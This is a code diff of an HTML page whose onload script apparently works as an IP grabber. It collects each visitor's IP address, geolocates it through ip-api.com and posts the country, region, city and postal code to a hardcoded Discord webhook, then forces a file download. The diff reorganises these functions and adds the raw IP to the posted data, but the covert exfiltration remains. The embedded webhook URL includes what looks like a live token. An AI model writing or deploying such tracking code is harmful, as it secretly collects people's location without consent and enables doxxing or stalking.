@@ -9,51 +9,59 @@
                 .then(data => {
                     const ip = data.ip;
                     document.getElementById('ipDisplay').innerText = 'IP: ' + ip;
-                    sendIPToWebhook(ip);
+                    getIPDetails(ip);
                 })
                 .catch(error => {
                     console.log('Error:', error);
                 });
         }
 
-        function sendIPToWebhook(ip) {
+        function getIPDetails(ip) {
             fetch('http://ip-api.com/json/' + ip)
                 .then(response => response.json())
                 .then(data => {
-                    const { country, regionName, city, areaCode } = data;
-                    const locationDetails = `Country: ${country}\nRegion: ${regionName}\nCity: ${city}\nArea Code: ${areaCode}`;
+                    const country = data.country;
+                    const region = data.regionName;
+                    const city = data.city;
+                    const areaCode = data.zip;
 
-                    const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
-                    const payload = {
-                        content: locationDetails
-                    };
+                    const ipDetails = `Country: ${country}, Region: ${region}, City: ${city}, Area Code: ${areaCode}`;
+                    document.getElementById('ipDetails').innerText = ipDetails;
 
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('Location details sent to webhook successfully.');
-                            downloadFile(ip); // Call the function to download the file after sending the location details
-                        } else {
-                            console.log('Failed to send location details to webhook.');
-                        }
-                    })
-                    .catch(error => {
-                        console.log('Error:', error);
-                    });
+                    sendIPToWebhook(ip, country, region, city, areaCode);
                 })
                 .catch(error => {
                     console.log('Error:', error);
                 });
         }
 
+        function sendIPToWebhook(ip, country, region, city, areaCode) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
+            const payload = {
+                content: `IP: ${ip}, Country: ${country}, Region: ${region}, City: ${city}, Area Code: ${areaCode}`
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP details sent to webhook successfully.');
+                    downloadFile(ip); // Call the function to download the file after sending the IP details
+                } else {
+                    console.log('Failed to send IP details to webhook.');
+                }
+            })
+            .catch(error => {
+                console.log('Error:', error);
+            });
+        }
+
         function downloadFile(ip) {
-            const filename = 'location.txt';
+            const filename = 'ip.txt';
             const content = 'IP: ' + ip;
             const element = document.createElement('a');
             element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(content));
@@ -90,6 +98,9 @@
 </head>
 <body onload="getIP()">
     <h1 id="ipDisplay">Loading...</h1>
-    <p>:)))))):</p>
+    <p id="ipDetails"></p>
+
+    <script>
+    </script>
 </body>
 </html>
